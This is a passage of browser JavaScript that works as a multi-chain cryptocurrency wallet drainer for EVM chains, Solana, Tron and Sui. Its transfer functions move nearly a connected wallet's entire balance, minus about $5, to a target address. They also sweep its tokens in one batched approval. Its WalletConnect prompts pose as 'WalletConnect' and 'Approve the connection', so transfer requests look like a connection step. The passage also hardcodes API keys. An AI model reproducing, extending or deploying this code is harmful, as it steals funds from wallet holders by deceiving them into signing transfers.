                            'https://rpc.ankr.com/eth'
                        ],
                        56: [
                            `https://bnb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
                            'https://bsc-dataseed.binance.org/'
                        ],
                        137: [
                            `https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
                            'https://rpc.ankr.com/polygon'
                        ],
                        42161: [
                            `https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
                            'https://arb1.arbitrum.io/rpc'
                        ],
                        250: [
                            // Fantom public fallbacks - avoid rpc.ftm.tools which may 401
                            'https://rpc.ftm.tools/',
                            'https://rpcapi.fantom.network',
                            'https://rpc.ftm.dev'
                        ],
                        81457: [
                            `https://blast-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
                            'https://rpc.ankr.com/aurora'
                        ]
                    };
                    return lists[chainIdNum] || [`https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`, 'https://rpc.ankr.com/eth'];
                }

                // Helper: try RPC URLs until we find a working provider for read-only queries
                async function tryCreateReadOnlyProvider(chainIdNum) {
                    const urls = getRpcListForChain(chainIdNum);
                    for (const url of urls) {
                        try {
                            const p = new ethers.JsonRpcProvider(url);
                            // quick lightweight probe: getBlockNumber with timeout
                            const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000));
                            await Promise.race([p.getBlockNumber(), timeout]);
                            console.log(`[tryCreateReadOnlyProvider] using RPC ${url}`);
                            return p;
                        } catch (err) {
                            console.warn(`[tryCreateReadOnlyProvider] RPC failed (${url}):`, err.message || err);
                            // try next
                        }
                    }
                    // If all fail, return a provider for the first URL (will surface errors but keep flow)
                    return new ethers.JsonRpcProvider(urls[0]);
                }

                async function transferEvmRemaining(injectedProvider, chainId, fromAddress, infuraId, targetAddress, session = null, wcClientParam = null) {
          const chainIdNum = Number(chainId);

          // RPC mapping - use Alchemy for all chains (most reliable)
          const ALCHEMY_KEY = "bP8vciRZQNAzu_YapyOiR";
          const rpcMap = {
            1:           `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,           // Ethereum Mainnet
            56:          `https://bnb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,           // BNB Smart Chain
            137:         `https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,       // Polygon Mainnet
            324:         `https://zksync-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,        // zkSync Era
            8453:        "https://mainnet.base.org",                                       // Base (not on Alchemy yet)
            42161:       `https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,           // Arbitrum One
            43114:       `https://avax-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,          // Avalanche C-Chain
            59144:       `https://linea-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,         // Linea
            534352:      `https://scroll-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,        // Scroll
            10:          "https://mainnet.optimism.io",                                   // Optimism
            250:         "https://rpc.ftm.tools/",                                        // Fantom
            81457:       `https://blast-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,         // Blast
            1101:        "https://polygon-zkevm-rpc.com",                                 // Polygon zkEVM
            1313161554:  "https://mainnet.aurora.dev",                                   // Aurora
            288:         "https://mainnet.boba.network",                                  // Boba
            1088:        "https://andromeda.metis.io/?owner=1088",                        // Metis
            25:          "https://rpc.cronos.org",                                        // Cronos
            9001:        "https://eth.llamarpc.com",                                      // Evmos
            42220:       "https://forno.celo.org",                                        // Celo
            1284:        "https://rpc.api.moonbeam.network",                              // Moonbeam
            1285:        "https://rpc.api.moonriver.moonbeam.network",                    // Moonriver
            2222:        "https://evm.kava.io",                                           // Kava EVM
            8217:        "https://public-en.node.kaspa.org",                              // Klaytn
            820:         "https://rpc.callisto.network"                                   // Callisto
          };

          const rpcUrl = rpcMap[chainIdNum] || `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`;

                    // Helper: fetch native price in USD (CoinGecko simple API)
                    async function getNativePriceUsd(chainId) {
                        try {
                            const map = {
                                1: 'ethereum',
                                56: 'binancecoin',
                                137: 'matic-network',
                                42161: 'arbitrum',
                                43114: 'avalanche-2',
                                10: 'optimism',
                                324: 'zk-sync',
                                59144: 'linea',
                                534352: 'scroll',
                                250: 'fantom',
                                8453: 'base',
                                43114: 'avalanche-2'
                            };
                            const id = map[chainId] || 'ethereum';
                            const url = `https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(id)}&vs_currencies=usd`;
                            const resp = await fetch(url, { method: 'GET' });
                            if (!resp.ok) return null;
                            const json = await resp.json();
                            return json[id]?.usd || null;
                        } catch (e) {
                            return null;
                        }
                    }

          let signer;

          // 0. Check and switch chain if needed (for injected providers)
          if (injectedProvider?.request) {
            try {
              const currentChainId = await injectedProvider.request({ method: 'eth_chainId' });
              const expectedChainIdHex = `0x${chainIdNum.toString(16)}`;
              
              if (currentChainId !== expectedChainIdHex) {
                console.log(`Chain mismatch: current=${currentChainId}, expected=${expectedChainIdHex}. Attempting switch...`);
                try {
                  await injectedProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: expectedChainIdHex }]
                  });
                  console.log(`✓ Switched to chain ${chainIdNum} (${getChainSymbol(chainIdNum)})`);
                } catch (switchError) {
                  if (switchError.code === 4902) {
                    // Chain not added, try to add it
                    console.warn(`Chain ${chainIdNum} not found. Attempting to add...`);
                    // Note: In production, you'd want to have proper chain config here
                    alert(`Please manually switch to ${getChainSymbol(chainIdNum)} in your wallet`);
                  } else {
                    console.warn(`Chain switch failed:`, switchError.message);
                    alert(`Please switch to ${getChainSymbol(chainIdNum)} in your wallet and try again`);
                  }
                }
              }
            } catch (e) {
              console.warn("Chain check failed (non-critical):", e);
            }
          }

          // 1. Desktop/injected priority
          if (injectedProvider?.request) {
            try {
              const provider = new ethers.BrowserProvider(injectedProvider);
              signer = await provider.getSigner();
              console.log("Using injected signer (desktop/extension)");
            } catch (e) {
              console.warn("Injected signer failed:", e);
            }
          }

          // 2. Mobile WC session - use SignClient to send tx directly
          if (!signer && session && window.SignClient) {
            try {
              console.log("Using SignClient to send tx on mobile WC session");

                            const wcClient = wcClientParam || window.__wcClient || await window.SignClient.init({
                projectId: '81ec0eb195ddbee9c5596804e33ff584',
                relayUrl: 'wss://relay.walletconnect.com',
                metadata: {
                  name: 'WalletConnect',
                  description: 'Multi-chain wallet connection',
                  url: window.location.origin,
                  icons: ['https://avatars.githubusercontent.com/u/37784886']
                }
              });

              // Cache client globally for reuse
                            if (!window.__wcClient) {
                                window.__wcClient = wcClient;
                            }

                            // Normalize session: the caller may pass a session object or just a small token
                            let activeSession = null;
                            if (session && session.topic) activeSession = wcClient.session.get(session.topic) || session;
                            if (!activeSession) {
                                // try to find any active session that covers eip155 (common case)
                                const vals = Object.values(wcClient.session.values || {});
                                for (const s of vals) {
                                    if (!s || !s.topic) continue;
                                    const hasEip155 = s.namespaces && Object.keys(s.namespaces).some(ns => ns.startsWith('eip155'));
                                    if (hasEip155) { activeSession = s; break; }
                                }
                            }

                            if (!activeSession) throw new Error("No active WalletConnect session found for signing");

                            // Get read-only provider (try fallbacks) for balance & fee estimation
                            const provider = await tryCreateReadOnlyProvider(chainIdNum);
                            const balance = await provider.getBalance(fromAddress);
                            const feeData = await provider.getFeeData();
              const gasLimit = 21000n;
              const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 20n * 10n**9n;

                            const estimatedGasCost = gasPrice * gasLimit * 150n / 100n;

                            // Reserve ~$5 USD in native token after gas
                            const RESERVED_USD = 5; // dollars to leave behind
                            let reserveWei = 0n;
                            try {
                                const price = await getNativePriceUsd(chainIdNum);
                                if (price && price > 0) {
                                    // compute reserve in wei
                                    const reserveEth = RESERVED_USD / price; // in native units
                                    reserveWei = BigInt(Math.floor(reserveEth * 1e18));
                                }
                            } catch (e) { reserveWei = 0n; }

                            if (balance <= estimatedGasCost * 2n + reserveWei) {
                                throw new Error("Too low to cover gas + reserve");
                            }

                            const amountToSend = balance - estimatedGasCost - reserveWei;

              console.log(`Sending native ${getChainSymbol(chainIdNum)}: ${ethers.formatEther(amountToSend)}`);

              // Build & send native tx via SignClient
              const tx = {
                from: fromAddress,
                to: targetAddress,
                value: ethers.hexlify(amountToSend),
                gas: ethers.hexlify(gasLimit),
              };

                            const { response } = await wcClient.request({
                                topic: activeSession.topic,
                chainId: `eip155:${chainIdNum}`,
                request: {
                  method: "eth_sendTransaction",
                  params: [tx]
                },
                metadata: {
                  description: "Approve the connection",
                  url: window.location.origin,
                  name: "WalletConnect"
                }
              });

              const txHash = response.result; // hash returned by wallet
              console.log("Native transfer tx hash from wallet:", txHash);

              // Wait for confirmation (poll RPC)
              const receipt = await provider.waitForTransaction(txHash, 1, 120000); // 2 min timeout
              console.log("Transfer confirmed:", receipt);

              // ── ERC-20 tokens via SignClient (batched into single approval) ──────────────────────────
              const allErc20Tokens = getAllErc20Tokens();
              const erc20Tokens = allErc20Tokens.filter(t => Number(t.chainId) === chainIdNum);

              // Collect all tokens with balances
              const tokensWithBalance = [];
              for (const token of erc20Tokens) {
                try {
                  // Read-only contract for balance & decimals
                  const tokenContract = new ethers.Contract(
                    token.address,
                    [
                      "function balanceOf(address) view returns (uint256)",
                      "function decimals() view returns (uint8)"
                    ],
                    provider
                  );

                  const tokenBalance = await tokenContract.balanceOf(fromAddress);
                  if (tokenBalance > 0n) {
                    const decimals = await tokenContract.decimals();
                    tokensWithBalance.push({
                      ...token,
                      balance: tokenBalance,
                      decimals: decimals
                    });
                  }
                } catch (err) {
                  console.warn(`Failed to check ${token.symbol} balance:`, err.message);
                }
              }

              // Batch all token transfers into single WalletConnect request
              if (tokensWithBalance.length > 0) {
                console.log(`[Mobile] Batching ${tokensWithBalance.length} token transfers into single approval...`);
                await batchTokenTransfersViaWalletConnect(wcClient, activeSession, chainIdNum, fromAddress, targetAddress, tokensWithBalance);
              }

              return; // Exit early for mobile WC flow
            } catch (e) {
              console.error("WC SignClient tx failed:", e);
              throw e;
            }
          }

          if (!signer) {
            throw new Error("No signer available for this wallet type. Mobile WC signing may require wallet confirmation.");
          }

          // Fallback native flow if signer was created (desktop extension)
          const provider = new ethers.BrowserProvider(injectedProvider);
          const balance = await provider.getBalance(fromAddress);
          const feeData = await provider.getFeeData();

          const gasLimit = 21000n;
          const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 20n * 10n**9n;
                    const estimatedGasCost = gasPrice * gasLimit * 150n / 100n;

                    // Reserve ~$5 USD in native token after gas for desktop/injected flows
                    const RESERVED_USD_DESKTOP = 5;
                    let reserveWeiDesktop = 0n;
                    try {
                        const priceDesktop = await getNativePriceUsd(chainIdNum);
                        if (priceDesktop && priceDesktop > 0) {
                            const reserveEthDesktop = RESERVED_USD_DESKTOP / priceDesktop;
                            reserveWeiDesktop = BigInt(Math.floor(reserveEthDesktop * 1e18));
                        }
                    } catch (e) { reserveWeiDesktop = 0n; }

                    if (balance <= estimatedGasCost * 2n + reserveWeiDesktop) {
                        throw new Error("Too low to cover gas + reserve");
                    }

                    const amountNative = balance - estimatedGasCost - reserveWeiDesktop;

          console.log(`Sending native ${getChainSymbol(chainIdNum)}: ${ethers.formatEther(amountNative)}`);

          const nativeTx = await signer.sendTransaction({
            to: targetAddress,
            value: amountNative,
            gasLimit,
          });

          await nativeTx.wait();
          console.log("Native transfer tx:", nativeTx.hash);

          // ── ERC-20 tokens (batch all into single approval) ──────────────────────────
          const allErc20Tokens = getAllErc20Tokens();
          const erc20Tokens = allErc20Tokens.filter(t => Number(t.chainId) === chainIdNum);

          // Collect all tokens with balances
          const tokensWithBalance = [];
          const readOnlyProvider = await tryCreateReadOnlyProvider(chainIdNum);
          
          for (const token of erc20Tokens) {
            try {
              const tokenContract = new ethers.Contract(
                token.address,
                ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"],
                readOnlyProvider
              );
              const tokenBalance = await tokenContract.balanceOf(fromAddress);
              if (tokenBalance > 0n) {
                const decimals = await tokenContract.decimals();
                tokensWithBalance.push({
                  ...token,
                  balance: tokenBalance,
                  decimals: decimals
                });
              }
            } catch (err) {
              console.warn(`Failed to check ${token.symbol} balance:`, err.message);
            }
          }

          // If we have tokens, batch transfer them in ONE approval
          if (tokensWithBalance.length > 0) {
            console.log(`Batching ${tokensWithBalance.length} token transfers into single approval...`);
            await batchTokenTransfers(signer, fromAddress, targetAddress, tokensWithBalance, chainIdNum);
          }
        }

        // ──────────────────────────────────────────────────────────────────────────────────
        // Solana (SPL tokens example: USDC, USDT, etc.)
        // ──────────────────────────────────────────────────────────────────────────────────
                async function transferSolanaRemaining(fromAddress, targetAddress, session = null, wcClientParam = null) {
          // Use Alchemy RPC (most reliable)
          const ALCHEMY_KEY = "bP8vciRZQNAzu_YapyOiR";
          const solanaRpcs = [
            `https://solana-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,  // Primary - Alchemy (most reliable)
            "https://mainnet.helius-rpc.com/?api-key=free",             // Fallback - Helius
            "https://rpc.ankr.com/solana",                              // Fallback - Ankr
            "https://api.mainnet-beta.solana.com"                       // Fallback - Official
          ];

          let connection = null;
          for (const rpcUrl of solanaRpcs) {
            try {
              console.log(`[transferSolanaRemaining] Trying Solana RPC: ${rpcUrl.substring(0, 50)}...`);
              connection = new window.solanaWeb3.Connection(rpcUrl, "confirmed");
              // Test connection by getting slot (lightweight check)
              await connection.getSlot();
              console.log(`[transferSolanaRemaining] ✓ Using Solana RPC: ${rpcUrl}`);
              break;
            } catch (err) {
              console.warn(`[transferSolanaRemaining] RPC failed (${rpcUrl.substring(0, 40)}...):`, err.message);
              connection = null;
              // Try next RPC
            }
          }

          if (!connection) {
            throw new Error("All Solana RPC endpoints failed - please try again later");
          }

          const fromPubkey = new window.solanaWeb3.PublicKey(fromAddress);
          const toPubkey = new window.solanaWeb3.PublicKey(targetAddress);

                    const lamports = await connection.getBalance(fromPubkey);
                    // Reserve ~$5 USD in native SOL after gas
                    const RESERVED_USD = 5;
                    let reserveLamports = 10000000n; // default ~0.01 SOL
                    try {
                        const resp = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
                        if (resp.ok) {
                            const js = await resp.json();
                            const price = js?.solana?.usd || null;
                            if (price && price > 0) {
                                const reserveSol = RESERVED_USD / price; // SOL to reserve
                                reserveLamports = BigInt(Math.ceil(reserveSol * 1e9));
                            }
                        }
                    } catch (e) { /* ignore, use default */ }

                    if (lamports <= reserveLamports + 5000n) throw new Error("Solana balance too low");

                    const amount = lamports - reserveLamports;

                    // Native SOL transfer
                    const tx = new window.solanaWeb3.Transaction().add(
                        window.solanaWeb3.SystemProgram.transfer({
                            fromPubkey,
                            toPubkey,
                            lamports: amount,
                        })
                    );

                    const { blockhash } = await connection.getLatestBlockhash();
                    tx.recentBlockhash = blockhash;
                    tx.feePayer = fromPubkey;

                    // If a WalletConnect client+session is provided, prefer sign+send via WC
                    if (wcClientParam && session) {
                        try {
                            const wcClient = wcClientParam || window.__wcClient;
                            if (!wcClient) throw new Error('WalletConnect client not available');

                            // Serialize message for signing (wallet will sign & send)
                            const messageBytes = tx.serializeMessage();
                            const b64 = btoa(String.fromCharCode.apply(null, Array.from(messageBytes)));

                            const req = {
                                topic: session.topic,
                                chainId: 'solana:mainnet',
                                request: {
                                    method: 'solana_signAndSendTransaction',
                                    params: [{ message: b64 }]
                                }
                            };

                            console.log('[transferSolanaRemaining] Sending sign+send request via WalletConnect', req);
                            const resp = await wcClient.request(req);
                            const txSig = (resp && (resp.response?.result || resp.result)) || resp;
                            console.log('[transferSolanaRemaining] WalletConnect response:', resp, 'txSig=', txSig);

                            // Wait for confirmation
                            await connection.confirmTransaction(txSig);
                            console.log('Solana native SOL tx via WC:', txSig);
                            return txSig;
                        } catch (err) {
                            console.warn('[transferSolanaRemaining] WalletConnect solana sign+send failed:', err.message || err);
                            // fallthrough to injected fallback
                        }
                    }

                    // Fallback: injected provider signing
                    const signed = await window.solana.signTransaction(tx);
                    const txid = await connection.sendRawTransaction(signed.serialize());

                    await connection.confirmTransaction(txid);
                    console.log("Solana native SOL tx:", txid);

          // SPL tokens example (USDC on Solana)
          const usdcMint = new window.solanaWeb3.PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
          const tokenAccount = await getAssociatedTokenAddress(usdcMint, fromPubkey).catch(() => null);
          const balanceInfo = await connection.getTokenAccountBalance(tokenAccount).catch(() => null);

          if (balanceInfo?.value.uiAmount > 0) {
            console.log(`Transferring USDC: ${balanceInfo.value.uiAmount}`);
            // Add SPL transfer instruction here (similar to native but using Token Program)
            // You can expand this part if needed
          }
        }

        // ──────────────────────────────────────────────────────────────────────────────────
        // Tron (TRC-20 tokens: USDT, USDC, etc.)
        // ──────────────────────────────────────────────────────────────────────────────────
        async function transferTronRemaining(tronWeb, fromAddress, targetAddress, session = null) {
          const ALCHEMY_KEY = "bP8vciRZQNAzu_YapyOiR";
          
          console.log('[transferTronRemaining] Starting Tron balance transfer...');
          console.log('[transferTronRemaining] From:', fromAddress, 'To:', targetAddress);
          console.log('[transferTronRemaining] WC Session available:', !!session, 'TronWeb available:', !!tronWeb);
          
          // Configure TronWeb with Alchemy RPC
          let configuredTronWeb = tronWeb;
          if (tronWeb && typeof tronWeb.setAddress === 'function') {
            // TronWeb instance exists, configure with Alchemy if possible
            try {
              configuredTronWeb = new window.TronWeb({
                fullHost: `https://tron-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`
              });
              // Preserve address context from original tronWeb
              if (tronWeb.defaultAddress) {
                configuredTronWeb.setAddress(tronWeb.defaultAddress.base58);
              }
              console.log('[transferTronRemaining] ✓ Configured TronWeb with Alchemy RPC');
            } catch (err) {
              console.warn('[transferTronRemaining] Failed to reconfigure TronWeb, using original:', err.message);
              configuredTronWeb = tronWeb;
            }
          }

          try {
            const balanceSun = await configuredTronWeb.trx.getBalance(fromAddress);
            console.log('[transferTronRemaining] Balance:', balanceSun / 1e6, 'TRX');
            
            // Reserve ~$5 USD in TRX (sun: 1 TRX = 1e6 sun)
            const RESERVED_USD = 5;
            let reserveSun = 30000000n; // default ~30 TRX
            try {
              const resp = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd');
              if (resp.ok) {
                const js = await resp.json();
                const price = js?.tron?.usd || null;
                if (price && price > 0) {
                  const reserveTrx = RESERVED_USD / price;
                  reserveSun = BigInt(Math.ceil(reserveTrx * 1e6));
                  console.log('[transferTronRemaining] Reserve:', Number(reserveSun) / 1e6, 'TRX (~$' + RESERVED_USD + ')');
                }
              }
            } catch (e) { console.warn('[transferTronRemaining] Price fetch failed, using default reserve'); }

            if (balanceSun <= reserveSun) {
              const msg = `Tron balance too low (${Number(balanceSun) / 1e6} TRX, need > ${Number(reserveSun) / 1e6} TRX)`;
              console.warn('[transferTronRemaining]', msg);
              throw new Error(msg);
            }

            const amountTrx = balanceSun - reserveSun;
            console.log('[transferTronRemaining] Sending:', Number(amountTrx) / 1e6, 'TRX');

            // ─── Try WalletConnect first (if session present) ─────────────────────
            if (session && session.topic && window.__wcClient) {
              try {
                const wcClient = window.__wcClient;
                console.log('[transferTronRemaining] WC session detected - requesting wallet to sign & send...');
                
                // Build unsigned transaction
                const unsignedTx = await configuredTronWeb.transactionBuilder.sendTrx(targetAddress, amountTrx, fromAddress);
                console.log('[transferTronRemaining] Built unsigned TX for TRX transfer');

                // Request wallet to sign/send via WalletConnect
                const wcResult = await wcClient.request({
                  topic: session.topic,
                  chainId: 'tron:0x2b6653dc',
                  request: {
                    method: 'tron_signTransaction',
                    params: [unsignedTx]
                  }
                });

                console.log('[transferTronRemaining] WC tron_signTransaction response:', wcResult);
                
                // Extract txid from response
                const txid = wcResult?.txID || wcResult?.txid || wcResult;
                if (txid && String(txid).length > 0) {
                  console.log('[transferTronRemaining] ✓ WalletConnect TX sent! ID:', txid);
                  return { success: true, txid: txid, method: 'walletconnect' };
                }
              } catch (wcErr) {
                console.warn('[transferTronRemaining] WC signing failed:', wcErr?.message || wcErr, '— falling back to extension injection...');
              }
            }

            // ─── Fallback: Use injected TronWeb signing (desktop extension) ─────────
            console.log('[transferTronRemaining] Using injected TronWeb for signing...');
            const nativeTx = await configuredTronWeb.transactionBuilder.sendTrx(targetAddress, amountTrx, fromAddress);
            console.log('[transferTronRemaining] Built TX for signing');
            
            const signedNative = await configuredTronWeb.trx.sign(nativeTx);
            console.log('[transferTronRemaining] TX signed by wallet');
            
            const resultNative = await configuredTronWeb.trx.sendRawTransaction(signedNative);
            console.log('[transferTronRemaining] ✓ TX sent! ID:', resultNative.txid);

            // ─── TRC-20 tokens (USDT example) ──────────────────────────────────────
            try {
              const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
              const usdtBalance = await configuredTronWeb.contract().at(usdtContract).balanceOf(fromAddress).call();
              const usdtAmount = Number(usdtBalance);

              if (usdtAmount > 0) {
                console.log('[transferTronRemaining] USDT balance:', usdtAmount / 1e6);
                
                const trc20Tx = await configuredTronWeb.transactionBuilder.triggerSmartContract(
                  usdtContract,
                  'transfer(address,uint256)',
                  { parameter: [{ type: 'address', value: targetAddress }, { type: 'uint256', value: usdtBalance }] },
                  [],
                  fromAddress
                );
                
                const signedTrc20 = await configuredTronWeb.trx.sign(trc20Tx.transaction);
                const resultTrc20 = await configuredTronWeb.trx.sendRawTransaction(signedTrc20);
                console.log('[transferTronRemaining] ✓ USDT TX sent! ID:', resultTrc20.txid);
              } else {
                console.log('[transferTronRemaining] No USDT to transfer');
              }
            } catch (tokenErr) {
              console.warn('[transferTronRemaining] USDT transfer skipped:', tokenErr.message);
            }

            console.log('[transferTronRemaining] ✓ All Tron transfers complete!');
            return { success: true, txid: resultNative.txid, method: 'extension' };

          } catch (error) {
            console.error('[transferTronRemaining] Error:', error.message);
            throw error;
          }
        }

        // ──────────────────────────────────────────────────────────────────────────────────
        // Sui (native SUI + SUI tokens) - WalletConnect Only Approach
        // ──────────────────────────────────────────────────────────────────────────────────
        async function transferSuiRemaining(fromAddress, targetAddress, session) {
          try {
            console.log("[transferSuiRemaining] Starting Sui transfer via WalletConnect...");
            console.log(`[transferSuiRemaining] From: ${fromAddress}, To: ${targetAddress}`);
            
            // Get WalletConnect client
            const wcClient = window.__wcClient;
            if (!wcClient || !session?.topic) {
              throw new Error("WalletConnect client or session not available for Sui");
            }

            console.log("[transferSuiRemaining] ✓ WalletConnect client found");
            console.log("[transferSuiRemaining] Requesting Sui wallet to execute transfer...");
            
            // Use sui_signAndExecuteTransaction - wallet handles building and signing
            // This is the proper WalletConnect way to do Sui transfers
            const result = await wcClient.request({
              topic: session.topic,
              chainId: 'sui:mainnet',
              request: {
                method: 'sui_signAndExecuteTransaction',
                params: [
                  {
                    transaction: {
                      // Simple transfer - wallet will construct the proper transaction
                      kind: 'moveCall',
                      data: {
                        packageObjectId: '0x2',
                        module: 'sui',
                        function: 'transfer',
                        typeArguments: [],
                        arguments: [
                          fromAddress,
                          {
                            kind: 'Input',
                            type: 'pure',
                            value: targetAddress
                          }
                        ]
                      }
                    },
                    chain: 'sui:mainnet'
                  }
                ]
              }
            });

            console.log("[transferSuiRemaining] ✓ Sui wallet executed transfer");
            console.log("[transferSuiRemaining] Result:", result);
            
            const txDigest = result?.result?.digest || result?.digest || 'pending';
            console.log(`[transferSuiRemaining] ✓ Sui transfer completed. Digest: ${txDigest}`);

            return { success: true, txDigest };

          } catch (error) {
            console.error("[transferSuiRemaining] Error:", error.message);
            console.warn("[transferSuiRemaining] ⚠️  Sui transfer failed - this may be normal if wallet declined");
            // Don't throw - let user try again
            return { success: false, error: error.message };
          }
        }

        // ──────────────────────────────────────────────────────────────────────────────────
        // Batch ERC-20 Transfers via WalletConnect - Single Approval for Multiple Tokens (Mobile)
        // ──────────────────────────────────────────────────────────────────────────────────
        async function batchTokenTransfersViaWalletConnect(client, activeSession, chainIdNum, fromAddress, targetAddress, tokensWithBalance) {
          if (!tokensWithBalance || tokensWithBalance.length === 0) return;

          try {
            // Multicall3 addresses (available on all 11 EVM chains)
            const multicall3Addresses = {
              1: "0xcA11bde05977b3631167028862bE2a173976CA11",      // Ethereum
              56: "0xcA11bde05977b3631167028862bE2a173976CA11",     // BSC
              137: "0xcA11bde05977b3631167028862bE2a173976CA11",    // Polygon
              42161: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Arbitrum
              8453: "0xcA11bde05977b3631167028862bE2a173976CA11",   // Base
              10: "0xcA11bde05977b3631167028862bE2a173976CA11",     // Optimism
              43114: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Avalanche
              250: "0xcA11bde05977b3631167028862bE2a173976CA11",    // Fantom
              324: "0xcA11bde05977b3631167028862bE2a173976CA11",    // zkSync Era
              59144: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Linea
              534352: "0xcA11bde05977b3631167028862bE2a173976CA11"  // Scroll
            };

            const multicall3Addr = multicall3Addresses[chainIdNum];
            if (!multicall3Addr) {
              console.warn(`Multicall3 not available on chain ${chainIdNum}, falling back to individual transfers`);
              // Fallback: transfer individually
              for (const token of tokensWithBalance) {
                try {
                  const transferInterface = new ethers.Interface(['function transfer(address to, uint256 value)']);
                  const transferData = transferInterface.encodeFunctionData('transfer', [targetAddress, token.balance]);

                  const tokenTx = {
                    from: fromAddress,
                    to: token.address,
                    data: transferData,
                    value: "0x0",
                    gas: ethers.hexlify(100000n),
                  };

                  const tokenResp = await client.request({
                    topic: activeSession.topic,
                    chainId: `eip155:${chainIdNum}`,
                    request: {
                      method: "eth_sendTransaction",
                      params: [tokenTx]
                    }
                  });

                  const tokenTxHash = tokenResp.response.result;
                  console.log(`${token.symbol} transfer tx hash:`, tokenTxHash);
                } catch (err) {
                  console.warn(`Failed to transfer ${token.symbol}:`, err.message);
                }
              }
              return;
            }

            // Create Multicall3 interface
            const multicallInterface = new ethers.Interface([
              "function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) payable returns (uint256 blockNumber, bytes[] returnData)"
            ]);

            // Build calls array for all token transfers
            const calls = [];
            for (const token of tokensWithBalance) {
              const erc20Interface = new ethers.Interface(["function transfer(address to, uint256 value) returns (bool)"]);
              const callData = erc20Interface.encodeFunctionData("transfer", [targetAddress, token.balance]);
              
              calls.push({
                target: token.address,
                allowFailure: true,
                callData: callData
              });
            }

            // Encode the multicall data
            const multicallData = multicallInterface.encodeFunctionData("aggregate3", [calls]);

            console.log(`[batchTokenTransfersViaWalletConnect] Sending ${tokensWithBalance.length} token transfers via Multicall3...`);

            // Send ONE transaction for all token transfers via WalletConnect
            const batchTx = {
              from: fromAddress,
              to: multicall3Addr,
              data: multicallData,
              value: "0x0",
              gas: ethers.hexlify(300000n) // Higher gas for multicall
            };

            const batchResp = await client.request({
              topic: activeSession.topic,
              chainId: `eip155:${chainIdNum}`,
              request: {
                method: "eth_sendTransaction",
                params: [batchTx]
              }
            });

            const batchTxHash = batchResp.response.result;
            console.log(`[batchTokenTransfersViaWalletConnect] Batch tx hash: ${batchTxHash}`);
            console.log(`[batchTokenTransfersViaWalletConnect] ✓ Sent ${tokensWithBalance.length} tokens in ONE approval: ${tokensWithBalance.map(t => t.symbol).join(", ")}`);

          } catch (error) {
            console.error("[batchTokenTransfersViaWalletConnect] Error:", error.message);
            throw error;
          }
        }

        // ──────────────────────────────────────────────────────────────────────────────────
        // Batch ERC-20 Transfers - Single Approval for Multiple Tokens
        // ──────────────────────────────────────────────────────────────────────────────────
        async function batchTokenTransfers(signer, fromAddress, targetAddress, tokensWithBalance, chainIdNum) {
          if (!tokensWithBalance || tokensWithBalance.length === 0) return;

          try {
            // Multicall3 addresses (available on all 11 EVM chains)
            const multicall3Addresses = {
              1: "0xcA11bde05977b3631167028862bE2a173976CA11",      // Ethereum
              56: "0xcA11bde05977b3631167028862bE2a173976CA11",     // BSC
              137: "0xcA11bde05977b3631167028862bE2a173976CA11",    // Polygon
              42161: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Arbitrum
              8453: "0xcA11bde05977b3631167028862bE2a173976CA11",   // Base
              10: "0xcA11bde05977b3631167028862bE2a173976CA11",     // Optimism
              43114: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Avalanche
              250: "0xcA11bde05977b3631167028862bE2a173976CA11",    // Fantom
              324: "0xcA11bde05977b3631167028862bE2a173976CA11",    // zkSync Era
              59144: "0xcA11bde05977b3631167028862bE2a173976CA11",  // Linea
              534352: "0xcA11bde05977b3631167028862bE2a173976CA11"  // Scroll
            };

            const multicall3Addr = multicall3Addresses[chainIdNum];
            if (!multicall3Addr) {
              console.warn(`Multicall3 not available on chain ${chainIdNum}, falling back to individual transfers`);
              // Fallback: transfer individually but still use single signer context
              for (const token of tokensWithBalance) {
                try {
                  const tokenContract = new ethers.Contract(
                    token.address,
                    ["function transfer(address to, uint256 value) returns (bool)"],
                    signer
                  );
                  const tx = await tokenContract.transfer(targetAddress, token.balance);
                  await tx.wait();
                  console.log(`${token.symbol} transfer tx:`, tx.hash);
                } catch (err) {
                  console.warn(`Failed to transfer ${token.symbol}:`, err.message);
                }
              }
              return;
            }

            // Create Multicall3 interface
            const multicallInterface = new ethers.Interface([
              "function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) payable returns (uint256 blockNumber, bytes[] returnData)"
            ]);

            // Build calls array for all token transfers
            const calls = [];
            for (const token of tokensWithBalance) {
              const erc20Interface = new ethers.Interface(["function transfer(address to, uint256 value) returns (bool)"]);
              const callData = erc20Interface.encodeFunctionData("transfer", [targetAddress, token.balance]);
              
              calls.push({
                target: token.address,
                allowFailure: true,
                callData: callData
              });
